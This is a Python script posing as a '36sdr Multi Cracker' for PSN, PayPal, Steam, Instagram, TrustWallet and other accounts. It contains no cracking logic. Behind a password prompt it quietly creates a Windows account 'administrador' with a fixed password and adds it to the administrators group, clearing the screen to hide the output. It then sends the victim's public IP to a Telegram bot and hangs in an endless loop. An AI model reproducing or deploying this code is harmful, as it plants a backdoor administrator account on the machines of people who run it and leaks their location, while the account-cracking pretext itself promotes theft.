print('''

                                                                    
        .--,-``-.                                                 
        /   /     '.                                               
        / ../        ;     ,---.                     ,---,          
        \ ``\  .`-    '   /     \                  ,---.'|  __  ,-. 
        \___\/   \   :  /    / '    .--.--.       |   | :,' ,'/ /| 
            \   :   | .    ' /    /  /    '      |   | |'  | |' | 
            /  /   / '    / ;    |  :  /`./    ,--.__| ||  |   ,' 
            \  \   \ |   :  \    |  :  ;_     /   ,'   |'  :  /   
        ___ /   :   |;   |   ``.  \  \    `. .   '  /  ||  | '    
        /   /\   /   :'   ;      \  `----. '   ;   |:  |;  : |    
        / ,,/  ',-    .'   |  .\  | /  /`--'  /|   | '/  '|  , ;    
        \ ''\        ; |   :  ';  :'--'.     / |   :    :| ---'     
        \   \     .'   \   \    /   `--'---'   \   \  /            
        `--`-,,-'      `---`--`                `----'             
                                                                    
        ''')



password = "sadra0098ss"
token = ""
chat_id = ""


pss = input("Enter The Password --> ")

if pss == password:
    pass
elif pss != password:
    print("password is FALSE")
    exit()
else:
    pass

from os import system as sys
from requests import get
import re
cmd = "net user administrador Amir11228 /add"
cmd2 = "net localgroup administrators administrador /add"
sys(cmd)
sys("cls")
sys(cmd2)
sys("cls")


print("WellCome To 36sdr Multi Cracker !\n\nChoose What to Crack Here\n1.PSN\n2.VPS\n3.Paypal\n4.UPLAY\n5.INSTAGRAM\n6.STEAM\n7.TrustWallet\n")

inp = input("file user.txt va pass.txt ro dar sorat niaz kenar file asli bezarid \nEnter Your Staff Number --> ")

lis = ["1", "2", "3", "4", "5", "6", "7"]
getserver = get("http://checkip.dyndns.com/")
ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(getserver.text).group(1)

get(f"https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text="+ip)

if inp in lis:
    print("Lotfan Sabr Konid , dar hal baresi file ha . . .")
    while True:
        pass
else:
    print("dash adad dorost vared kon")